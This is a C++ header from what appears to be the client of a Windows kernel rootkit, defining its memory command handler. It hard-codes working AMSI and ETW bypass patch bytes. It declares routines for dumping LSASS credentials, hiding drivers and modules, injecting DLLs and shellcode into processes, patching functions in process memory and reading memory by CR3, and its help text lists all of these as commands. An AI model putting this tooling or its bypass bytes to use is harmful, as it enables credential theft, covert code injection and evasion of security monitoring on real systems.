#pragma once
#include "pch.h"
#include "CommandHandler.h"

constexpr wchar_t AMSI_PATH[] = LR"(C:\Windows\System32\Amsi.dll)";
constexpr wchar_t NTDLL_PATH[] = LR"(C:\Windows\System32\ntdll.dll)";
inline std::vector<byte> AMSI_BYPASS_PAYLOAD = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
inline std::vector<byte> ETW_BYPASS_PAYLOAD = { 0xC3 };
constexpr SIZE_T MAX_SHELLCODE_PARAMETERS = 3;

struct Credential {
	std::wstring Username;
	std::wstring EncryptedHash;
	std::wstring Domain;
};

struct CredentialsInformation {
	std::vector<UCHAR> DesKey;
	std::vector<UCHAR> Iv;
	std::vector<Credential> Credentials;
};

class MemoryHandlerException : public std::runtime_error {
private:
	std::string msg;
public:
	MemoryHandlerException(_In_ const std::string& message)
		: std::runtime_error(message), msg(message) {}
	const char* what() const override {
		return msg.c_str();
	}
};

class MemoryHandler : public CommandHandler {
private:
	CredentialsInformation DumpCredentials();
	bool HideDriver(_In_ std::wstring driverPath, _In_ bool hide);
	bool HideModule(_In_ DWORD pid, _In_ std::wstring modulePath, _In_ bool hide);
	bool InjectDll(_In_ DWORD pid, _In_ std::string dllPath, _In_ InjectionType injectionType);
	bool InjectShellcode(_In_ DWORD pid, _In_ std::vector<byte> shellcode, std::vector<std::string> parameters, _In_ InjectionType injectionType);
	bool PatchModule(_In_ DWORD pid, _In_ std::wstring moduleName, _In_ std::string functionName, _In_ std::vector<byte> patch);
	bool PatchAmsi(_In_ DWORD pid);
	bool PatchEtw(_In_ DWORD pid);
	bool LoadNof(_In_ std::vector<byte> data, _In_ std::string entryPointName, _In_opt_ std::string parameter);
	unsigned long long GetProcessCr3(_In_ DWORD pid);
	unsigned long long ReadQwordByCr3(_In_ unsigned long long cr3, _In_ unsigned long long address);
	std::vector<byte> ReadMemoryByCr3(_In_ unsigned long long cr3, _In_ unsigned long long address, _In_ SIZE_T size);

public:
	MemoryHandler(_In_ std::shared_ptr<HANDLE> hNidhogg) : CommandHandler("Memory", hNidhogg) {};

	void PrintHelp() override {
		std::cout << termcolor::bright_magenta << termcolor::underline << "Options:" << termcolor::reset << std::endl;
		std::cout << termcolor::bright_magenta << "\t[*] " << termcolor::reset << "exit - Exit the program" << std::endl;
		std::cout << termcolor::bright_magenta << "\t[*] " << termcolor::reset << "back - Go back to the main menu" << std::endl;
		std::cout << termcolor::bright_magenta << "\t[*] " << termcolor::reset << "dump_creds - Dumping credentials from LSASS" << std::endl;
		std::cout << termcolor::bright_magenta << "\t[*] " << termcolor::reset << "hide_module [pid] [module path] - Hiding a module inside a process" << std::endl;
		std::cout << termcolor::bright_magenta << "\t[*] " << termcolor::reset << "[unhide_module | restore_module] [pid] [module path] - Restoring a module inside a process" << std::endl;
		std::cout << termcolor::bright_magenta << "\t[*] " << termcolor::reset << "hide_driver [driver path] - Hiding a driver" << std::endl;
		std::cout << termcolor::bright_magenta << "\t[*] " << termcolor::reset << "[unhide_driver | restore_driver] [driver path] - Revealing a driver after hiding it" << std::endl;
		std::cout << termcolor::bright_magenta << "\t[*] " << termcolor::reset << "inject_dll [apc | thread] [pid] [dll path] - Injecting a DLL into a process" << std::endl;
		std::cout << termcolor::bright_magenta << "\t[*] " << termcolor::reset << "inject_shellcode [apc | thread] [pid] [shellcode file] [parameter 1] [parameter 2] [parameter 3] - Injecting shellcode into a process" << std::endl;
		std::cout << termcolor::bright_magenta << "\t[*] " << termcolor::reset << "patch [pid] [module name] [function name] [patch comma separated] - Patching a module inside a process" << std::endl;
		std::cout << termcolor::bright_magenta << "\t[*] " << termcolor::reset << "patch_amsi [pid] - Patch AMSI in a process" << std::endl;
		std::cout << termcolor::bright_magenta << "\t[*] " << termcolor::reset << "patch_etw [pid] - Patch ETW in a process" << std::endl;
		std::cout << termcolor::bright_magenta << "\t[*] " << termcolor::reset << "load_nof [nof path] [entrypoint name] [parameter] - Load a NOF" << std::endl;
		std::cout << termcolor::bright_magenta << "\t[*] " << termcolor::reset << "get_cr3 [pid] - Get process CR3 by PID" << std::endl;
		std::cout << termcolor::bright_magenta << "\t[*] " << termcolor::reset << "read_cr3_qword [cr3] [address] - Read 8 bytes by CR3 and virtual address" << std::endl;
		std::cout << termcolor::bright_magenta << "\t[*] " << termcolor::reset << "read_cr3 [cr3] [address] [size] - Read memory by CR3, virtual address and size" << std::endl;
	}

	void HandleCommand(_In_ std::string command) override;
};

